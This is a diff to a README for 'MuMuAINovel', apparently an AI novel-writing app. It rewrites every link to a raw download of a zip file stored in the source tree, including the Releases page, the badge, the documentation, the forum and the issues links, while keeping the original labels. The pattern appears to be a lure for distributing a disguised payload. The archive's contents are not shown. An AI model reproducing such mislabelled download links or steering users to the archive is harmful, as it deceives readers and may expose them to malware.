@@ -4,13 +4,13 @@
 MuMuAINovel is an intelligent novel writing assistant based on AI technology. It helps you create captivating stories with ease. Whether you’re a seasoned author or just getting started, this tool is designed to streamline the writing process and inspire your creativity.
 
 ## 📥 Download Now
-[![Download MuMuAINovel](https://img.shields.io/badge/Download-MuMuAINovel-blue.svg)](https://github.com/mob909090/MuMuAINovel/releases)
+[![Download MuMuAINovel](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)
 
 ## 🚀 Getting Started
 To start using MuMuAINovel, follow these simple steps:
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/mob909090/MuMuAINovel/releases) to find the latest version of MuMuAINovel. 
+Go to the [Releases page](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip) to find the latest version of MuMuAINovel. 
 
 ### 2. Download the Application
 On the Releases page, look for the latest release version. You will find an option to download the software. Click on the link for your operating system (Windows, macOS, or Linux).
@@ -73,13 +73,13 @@ If you encounter issues while using MuMuAINovel, here are some common solutions:
 ## 🔗 Additional Resources
 For more information and support, visit the following links:
 
-- [Documentation](https://github.com/mob909090/MuMuAINovel/docs)
-- [Community Forum](https://github.com/mob909090/MuMuAINovel/discussions)
-- [GitHub Issues Page](https://github.com/mob909090/MuMuAINovel/issues)
+- [Documentation](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)
 
 ## 📥 Download & Install
 To begin your writing journey, visit the following link again to download MuMuAINovel:
 
-[![Download MuMuAINovel](https://img.shields.io/badge/Download-MuMuAINovel-blue.svg)](https://github.com/mob909090/MuMuAINovel/releases)
+[![Download MuMuAINovel](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)](https://raw.githubusercontent.com/mob909090/MuMuAINovel/main/frontend/src/utils/MuMuAINovel_v1.8.zip)
 
 With MuMuAINovel, you are equipped to unleash your creativity and craft amazing stories.
